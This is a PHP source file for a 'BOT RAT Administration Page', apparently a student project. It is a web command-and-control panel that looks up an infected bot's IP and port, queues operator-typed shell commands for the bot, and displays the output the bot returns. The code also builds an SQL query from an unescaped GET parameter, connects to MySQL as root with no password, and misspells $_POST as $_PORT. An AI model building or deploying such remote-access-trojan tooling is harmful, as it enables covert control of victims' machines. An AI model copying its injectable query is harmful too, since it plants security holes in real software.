<?php
if (isset($_GET['ID']) && !empty($_GET['ID'])) {
    $ID =  $_GET['ID'];
} else if (isset($_PORT['ID']) && !empty($_PORT['ID'])) {
    $ID =  $_PORT['ID'];
} else {
    $ID = 'no id';
}
$link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
mysqli_select_db($link, "pbl4");
$sql = "SELECT * FROM botes WHERE ID = '$ID'";
$result = mysqli_query($link, $sql);
$row = mysqli_fetch_assoc($result);
$fp = fopen('botActive.txt', 'w');
fwrite($fp, $row['ip']);
fwrite($fp, "&");
fwrite($fp, $row['port']);
fclose($fp);

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Run Command Bot</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
            background-color: #87ceeb;
            padding: 20px;

        }

        button {
            padding: 10px;
        }
    </style>
</head>

<body>
    <div id="command-form">
        <img src="serverIcon.png" alt="" width="180vw">
        <h2>BOT RAT Administration Page</h2>
        <form method="post" action="runCommand.php?ID=<?php echo $ID ?>" id="runcmdform">
            RAT BOT ID: <input type="text" name="ID" readonly value="<?php echo $row['ID'] ?>" /> <!-- Ấn Button sẽ lấy value của cái này rồi chạy file này từ đầu -> name = "bot"-->
            <br><br>
            RAT BOT IP: <input type="text" name="ip" readonly value="<?php echo $row['ip'] ?>" /> <!-- Ấn Button sẽ lấy value của cái này rồi chạy file này từ đầu -> name = "bot"-->
            <br><br>
            RAT BOT PORT: <input type="text" name="port" readonly value="<?php echo $row['port'];
                                                                            mysqli_close($link); ?>" />
            <p>Please enter your command: </p>
            <input type="text" name="cmdstr" size="35%">
            <p><input type="submit" name="buttonExecute" value="Execute"></p>
            <p><input type="submit" name="buttonGetCmd" value="Get Command Prompt"></p>
            <p><a href='index.php'>Back to Main</a></p>
        </form>
    </div>
</body>

</html>
<?php
if (isset($_POST['buttonExecute'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        //echo 'Received: ' . $cmdstr . '<br>';
        $query = "UPDATE botes SET cmd=? WHERE ID=?";
        $stmt = $db->prepare($query);
        $stmt->bind_param('ss', $cmdstr, $ID); //i(integer),s(string),d(double),b(blob)
        $stmt->execute();
        $db->close();
    }
} elseif (isset($_POST['buttonGetCmd'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4');
    if (mysqli_connect_errno()) exit;
    $query = "SELECT retstr FROM botes WHERE ID=?";
    $stmt = $db->prepare($query);
    $stmt->bind_param('s', $ID);
    $stmt->execute();
    $stmt->store_result();
    $stmt->bind_result($retStr);
    $stmt->fetch();
    echo "<textarea rows='20' cols='60'>";
    echo $retStr;
    echo "</textarea>";
    $db->close();
}
?>